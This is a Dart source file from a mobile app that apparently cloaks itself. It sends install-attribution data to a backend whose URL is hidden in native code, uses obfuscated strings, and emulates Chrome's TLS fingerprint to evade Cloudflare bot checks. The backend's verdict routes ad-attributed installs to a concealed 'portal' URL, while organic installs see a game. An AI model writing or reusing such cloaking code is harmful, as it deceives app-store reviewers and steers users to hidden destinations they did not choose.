import 'dart:convert';

import '../config/relay_config.dart';
import '../core/landing.dart';
import 'beacon_keystore.dart';
import 'seal_gate.dart';
import 'veiled_strings.dart';

// ============================================================
// VERDICT CALL — POST the body through native code, cache the answer
// ============================================================
// The backend is the single source of truth for the routing decision.
// The assembled attribution body is POSTed as plain JSON (no envelope /
// seal) and the backend's answer is returned verbatim. The endpoint lives
// only inside the native library — never as a plaintext/obfuscated string
// in the Dart image — so this file holds no endpoint literal at all.
//
// TRANSPORT. The config endpoint is behind Cloudflare, which fingerprints
// the TLS handshake (JA3/JA4) and serves a 403 challenge to stock clients
// — including the Dart `http` stack. So the POST itself is performed in
// native code (`SealGate.fetch` → `skyward_fetch`, wreq + Chrome
// emulation): Dart never opens the socket and never learns the URL. The
// native side returns only `"{status}\n{body}"`; a transport failure is
// reported as status 0.
//
// RESPONSE CONTRACT. The backend answers with:
//   • 200 + {ok:true,  url, expires}  → non-organic install → portal
//   • 404 + {ok:false, message}       → organic / "no data"  → game
// The 404 is a VALID negative verdict, NOT a transport error, so the body
// is parsed whenever it is JSON carrying an `ok` field — regardless of the
// HTTP status. Only a reply with no parseable `{ok:...}` (status 0, a 5xx,
// or a Cloudflare HTML challenge) counts as a transport failure. That
// distinction is what lets the coordinator commit the native route on a
// real {ok:false} while refusing to commit it on a network hiccup.
//
// On an approved response we cache both the URL AND its expiry so
// returning launches can skip the network call while the URL is still
// fresh.
// ============================================================

class VerdictCall {
  VerdictCall(this._keystore);

  final BeaconKeystore _keystore;

  Future<Verdict> ask(Map<String, dynamic> body) async {
    final SealGate gate = SealGate.instance;

    try {
      // The POST runs entirely in native code: URL, method, headers and
      // MIME are de-obfuscated there, the handshake is Chrome-emulated, and
      // only "{status}\n{body}" comes back. The body is sent as plain JSON,
      // unencrypted. A null reply means the gate is unavailable (non-Android
      // / dev build) — reject, which routes the install to the offline-
      // capable game. The Dart-side timeout is a backstop above the native
      // transport's own budget.
      final String? raw = await gate
          .fetch(jsonEncode(body))
          .timeout(Duration(seconds: RelayConfig.verdictTimeoutSeconds));
      if (raw == null) {
        return Verdict.rejected(VeiledStrings.get('e_gu'));
      }

      final int split = raw.indexOf('\n');
      final String statusPart = split < 0 ? raw : raw.substring(0, split);
      final String bodyPart = split < 0 ? '' : raw.substring(split + 1);
      final int status = int.tryParse(statusPart.trim()) ?? 0;

      // Status 0 is the native transport's "could not complete" signal
      // (no connection, TLS, timeout) — a transport failure, never a
      // verdict.
      if (status == 0) return Verdict.rejected('network:transport');

      // Parse the body regardless of HTTP status: a genuine negative
      // verdict arrives as 404 + {ok:false}. A body that is not JSON with
      // an `ok` (a Cloudflare HTML challenge, a bare 5xx, an empty reply)
      // is a transport-level failure and must stay NOT delivered.
      dynamic decoded;
      try {
        decoded = jsonDecode(bodyPart);
      } catch (_) {
        decoded = null;
      }
      if (decoded is! Map || !decoded.containsKey('ok')) {
        return Verdict.rejected('http_$status');
      }

      final Verdict verdict = Verdict.fromJson(
        Map<String, dynamic>.from(decoded),
      );

      if (verdict.hasDestination) {
        await _keystore.cacheDestination(verdict.url!, verdict.expiresAt);
      }
      return verdict;
    } catch (e) {
      return Verdict.rejected('network:$e');
    }
  }
}
